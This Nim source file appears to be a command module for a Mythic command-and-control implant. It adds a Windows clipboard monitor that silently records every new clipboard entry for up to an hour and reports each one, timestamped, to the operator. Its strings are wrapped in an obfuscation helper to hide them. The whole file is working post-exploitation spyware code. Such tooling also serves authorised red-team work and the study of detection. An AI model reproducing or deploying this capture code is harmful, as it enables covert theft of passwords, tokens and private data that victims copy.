import ../utils/m_responses
import ../utils/debug
import ../utils/strenc
import std/[json, times, sets, os, tables]

when defined(windows):
  import winim/lean

type
  ClipboardMonitorArgs = object
    duration: int
  
  ClipboardMonitorState* = object
    startTime: float
    endTime: float
    seenClips: HashSet[string]
    lastClip: string
    output: string

var clipboardMonitorActive* = false
var clipboardMonitorState*: ClipboardMonitorState

proc getClipboardText(): string =
  ## Get current clipboard text content (Windows only)
  when defined(windows):
    try:
      if OpenClipboard(0) == 0:
        return ""
      
      if IsClipboardFormatAvailable(CF_UNICODETEXT) == 0:
        CloseClipboard()
        return ""
      
      let hClipboardData = GetClipboardData(CF_UNICODETEXT)
      if hClipboardData == 0:
        CloseClipboard()
        return ""
      
      let pchData = GlobalLock(hClipboardData)
      if pchData == nil:
        CloseClipboard()
        return ""
      
      result = $cast[LPWSTR](pchData)
      discard GlobalUnlock(hClipboardData)
      CloseClipboard()
    except:
      CloseClipboard()
      return ""
  else:
    return ""

proc clipboardMonitor*(taskId: string, params: JsonNode): JsonNode =
  ## Start clipboard monitoring for a specified duration (Windows only)
  ## This runs as a background task and doesn't block the agent
  when defined(windows):
    try:
      let args = to(params, ClipboardMonitorArgs)
      
      if args.duration < 1 or args.duration > 3600:
        return mythicError(taskId, obf("Duration must be between 1 and 3600 seconds"))
      
      if clipboardMonitorActive:
        return mythicError(taskId, obf("Clipboard monitor is already running"))
      
      debug &"[DEBUG] Starting clipboard monitor for {args.duration} seconds (non-blocking)"
      
      # Initialize monitoring state
      clipboardMonitorState = ClipboardMonitorState(
        startTime: epochTime(),
        endTime: epochTime() + float(args.duration),
        seenClips: initHashSet[string](),
        lastClip: "",
        output: ""
      )
      
      # Get initial clipboard content
      let initialClip = getClipboardText()
      if initialClip.len > 0:
        clipboardMonitorState.seenClips.incl(initialClip)
        clipboardMonitorState.output.add(obf("=== Initial Clipboard ===\n"))
        clipboardMonitorState.output.add(initialClip)
        clipboardMonitorState.output.add("\n\n")
        clipboardMonitorState.lastClip = initialClip
      
      clipboardMonitorActive = true
      
      # Return processing status - agent will poll checkClipboardMonitor
      let msg = obf("Clipboard monitoring started for ") & $args.duration & obf(" seconds (background task)")
      return %*{
        obf("task_id"): taskId,
        obf("completed"): false,
        obf("status"): obf("processing"),
        obf("user_output"): msg
      }
      
    except Exception as e:
      return mythicError(taskId, obf("Error starting clipboard monitor: ") & e.msg)
  else:
    return mythicError(taskId, obf("clipboard_monitor command is only available on Windows"))

proc checkClipboardMonitor*(taskId: string): JsonNode =
  ## Check clipboard monitor status and return results when complete
  when defined(windows):
    if not clipboardMonitorActive:
      return nil
    
    # Check for clipboard changes
    let currentClip = getClipboardText()
    if currentClip.len > 0 and currentClip != clipboardMonitorState.lastClip:
      if currentClip notin clipboardMonitorState.seenClips:
        clipboardMonitorState.seenClips.incl(currentClip)
        let output = obf("\n=== Clipboard Change at ") & $now() & obf(" ===\n") & currentClip & "\n"
        clipboardMonitorState.output.add(output)
        clipboardMonitorState.lastClip = currentClip
        
        debug "[DEBUG] New clipboard content detected, returning immediately"
        
        # Return immediately with new clipboard data (still processing)
        return %*{
          obf("task_id"): taskId,
          obf("completed"): false,
          obf("status"): obf("processing"),
          obf("user_output"): output
        }
      clipboardMonitorState.lastClip = currentClip
    
    # Check if monitoring period is complete
    if epochTime() >= clipboardMonitorState.endTime:
      clipboardMonitorActive = false
      
      var finalOutput = ""
      if clipboardMonitorState.seenClips.len == 0:
        finalOutput = obf("Clipboard monitoring completed. No new clipboard changes detected.")
      else:
        finalOutput = obf("Clipboard monitoring completed. Total unique entries captured: ") & $clipboardMonitorState.seenClips.len
      
      debug "[DEBUG] Clipboard monitoring completed"
      
      return mythicSuccess(taskId, finalOutput)
    
    return nil
  else:
    return nil
